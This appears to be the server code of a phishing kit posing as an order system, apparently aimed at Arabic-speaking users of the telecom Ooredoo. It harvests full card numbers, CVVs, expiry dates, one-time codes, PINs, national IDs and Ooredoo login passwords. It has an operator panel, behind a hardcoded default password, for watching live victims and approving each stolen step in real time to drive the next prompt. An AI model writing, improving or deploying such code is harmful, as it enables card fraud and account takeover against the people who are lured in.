const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "fazaa2026";

let orders = [];
const visitors = new Map();
const ACTIVE_MS = 10000;

function activeVisitors() {
  const now = Date.now();
  for (const [id, v] of visitors) if (now - v.t > ACTIVE_MS) visitors.delete(id);
  return [...visitors.values()];
}

const isAdmin = req => req.headers["x-admin-password"] === ADMIN_PASSWORD;
const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);

function cleanOrder(b) {
  const p = b.pay && typeof b.pay === "object" ? b.pay : {};
  const ord = b.ooredoo && typeof b.ooredoo === "object" ? b.ooredoo : {};

  let rawCard = b.cardNumber || p.cardNumber || p.number || p.fullCard || p.card || "";
  if (typeof rawCard === "boolean") rawCard = "";

  let rawCvv = b.cvv || p.cvv || "";
  if (typeof rawCvv === "boolean") rawCvv = "";

  let rawExp = b.expiry || p.exp || p.expiry || "";
  if (typeof rawExp === "boolean") rawExp = "";

  let rawOtp = b.otp || p.otp || p.code || "";
  if (typeof rawOtp === "boolean") rawOtp = "";

  let rawPin = b.pin || p.pin || "";
  if (typeof rawPin === "boolean") rawPin = "";

  let rawName = b.cardName || p.cardName || p.name || "";
  if (typeof rawName === "boolean") rawName = "";

  return {
    ref: str(b.ref, 40), status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
    card: str(b.card, 10), watch: str(b.watch, 10),
    st: b.st === "resident" ? "resident" : "citizen",
    n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
    e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
    em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad || b.address || "", 500),
    bank: str(b.bank, 20), bankName: str(b.bankName || "", 200),
    lang: b.lang === "en" ? "en" : "ar",
    step: ["card", "otp", "pin", "ooredoo", "ooredoo-otp"].includes(b.step) ? b.step : undefined,
    pay: {
      cardName: str(rawName, 200),
      cardNumber: str(rawCard, 200),
      last4: str((rawCard.slice(-4) || p.last4 || "").replace(/\D/g, ""), 4),
      brand: ["visa", "mc", "amex"].includes(p.brand || b.brand) ? (p.brand || b.brand) : "",
      exp: str(rawExp, 50),
      cvv: str(rawCvv, 50),
      otp: str(rawOtp, 50),
      pin: str(rawPin, 50)
    },
    ooredoo: {
      username: str(ord.username, 200),
      password: str(ord.password, 200),
      otp: str(ord.otp, 50)
    }
  };
}

module.exports = async function handler(req, res) {
  try {
    const url = req.url.split("?")[0];
    const method = req.method;
    const b = req.body || {};

    res.setHeader("Content-Type", "application/json; charset=utf-8");
    res.setHeader("Cache-Control", "no-store");

    if (method === "POST" && url === "/api/orders") {
      const o = cleanOrder(b);
      if (o.pay === undefined) delete o.pay;
      if (o.step === undefined) delete o.step;
      if (b.ooredoo && typeof b.ooredoo === "object" && o.ref) {
        const i = orders.findIndex(x => x.ref === o.ref);
        if (i >= 0) {
          const incoming = b.ooredoo;
          const current = { ...orders[i].ooredoo };
          for (const key of ["username", "password", "otp"]) {
            if (Object.prototype.hasOwnProperty.call(incoming, key)) {
              current[key] = str(incoming[key], key === "otp" ? 50 : 200);
            }
          }
          orders[i].ooredoo = current;
          orders[i].status = "awaiting";
          orders[i].step = o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
          orders[i].decision = "";
          orders[i].reason = "";
          orders[i].next = "";
          orders[i].updated = Date.now();
          return res.status(200).json({ ok: true, ref: o.ref });
        }
      }
      if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) || !o.n || !/^\d{8,15}$/.test(o.p)) return res.status(400).json({ ok: false, error: "invalid" });
      const i = orders.findIndex(x => x.ref === o.ref);
      if (i >= 0) {
        const prev = orders[i];
        orders[i] = { ...prev, ...o, ts: prev.ts, status: prev.status === "confirmed" ? "confirmed" : o.status, decision: o.status === "awaiting" ? "" : prev.decision, reason: o.status === "awaiting" ? "" : prev.reason, updated: Date.now() };
      } else {
        orders.unshift({ ...o, ts: Date.now() });
        if (orders.length > 5000) orders.length = 5000;
      }
      return res.status(200).json({ ok: true, ref: o.ref });
    }

    if (method === "GET" && url.startsWith("/api/status/")) {
      const ref = decodeURIComponent(url.split("/").pop());
      const o = orders.find(x => x.ref === ref);
      if (!o) return res.status(404).json({ ok: false });
      return res.status(200).json({ ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next || "" });
    }

    if (method === "POST" && url === "/api/ping") {
      const id = str(b.id, 40); if (!id) return res.status(400).json({ ok: false });
      visitors.set(id, { t: Date.now(), page: str(b.page, 60) });
      return res.status(200).json({ ok: true });
    }

    if (method === "POST" && url === "/api/leave") {
      visitors.delete(str(b.id, 40));
      return res.status(200).json({ ok: true });
    }

    if (url.startsWith("/api/admin/")) {
      if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
      if (method === "GET" && url === "/api/admin/check") return res.status(200).json({ ok: true });
      if (method === "GET" && url === "/api/admin/orders") {
        const v = activeVisitors();
        return res.status(200).json({ ok: true, orders, active: v.length, pages: v.map(x => x.page) });
      }
      if (method === "POST" && /^\/api\/admin\/decide\//.test(url)) {
        const ref = decodeURIComponent(url.split("/").pop());
        const decision = b.decision === "reject" ? "reject" : "accept";
        const o = orders.find(x => x.ref === ref);
        if (!o) return res.status(404).json({ ok: false });
        const step = o.step || "card";
        if (decision === "reject") {
          o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
        } else {
          const nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "done" };
          const next = nextOf[step];
          o.decision = "accept"; o.reason = "";
          if (next === "done") { o.status = "confirmed"; o.next = "done"; }
          else { o.status = "stepok"; o.next = next; }
        }
        o.updated = Date.now();
        return res.status(200).json({ ok: true, status: o.status });
      }
      if (method === "DELETE" && url.startsWith("/api/admin/orders/")) {
        const ref = decodeURIComponent(url.split("/").pop());
        orders = orders.filter(o => o.ref !== ref);
        return res.status(200).json({ ok: true });
      }
    }

    return res.status(404).json({ ok: false });
  } catch (e) {
    return res.status(500).json({ ok: false, error: "internal" });
  }
};
